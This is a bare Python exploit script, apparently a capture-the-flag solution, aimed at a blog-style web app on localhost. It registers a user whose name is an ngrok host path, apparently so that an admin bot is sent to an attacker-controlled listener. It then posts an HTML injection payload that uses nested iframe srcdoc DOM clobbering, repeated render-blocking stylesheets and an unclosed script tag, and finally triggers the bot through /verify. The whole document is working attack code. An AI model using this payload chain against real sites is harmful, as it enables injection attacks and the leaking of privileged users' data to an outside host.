import requests

url = "http://localhost:8000"

redirect_url = "/4bbb-43-202-45-90.ngrok-free.app"

s = requests.Session()

print(s.post(url + "/register", data={"username": redirect_url, "password": "password"}).status_code)
print(s.post(url + "/login", data={"username": redirect_url, "password": "password"}).status_code)
print(s.post(
    url + "/create",
    data={
        "title": "Title",
        "content": """<iframe name=rows srcdoc=" <iframe name=rows srcdoc=&quot; <a id='author' href='//admin:a@me.com'></a> &quot;></iframe> "></iframe></p>"""
        + """<link rel="stylesheet" blocking="render" href="/css/bootstrap.min.css">
<link rel="stylesheet" blocking="render" href="/css/bootstrap-icons.css">
<link rel="stylesheet" blocking="render" href="/css/home.css">
<link rel="stylesheet" blocking="render" href="/css/posts.css">
<link rel="stylesheet" blocking="render" href="/css/search.css">"""
        * 100
        + """<script type="text/plain">""",
    },
).status_code)
uid = s.get(url + "/posts").text
uid = uid[uid.index('a href="/post/') :][14:50]
print(uid)
r = s.post(url + "/verify", data={"id": uid})
print(r.status_code)
print(r.text)
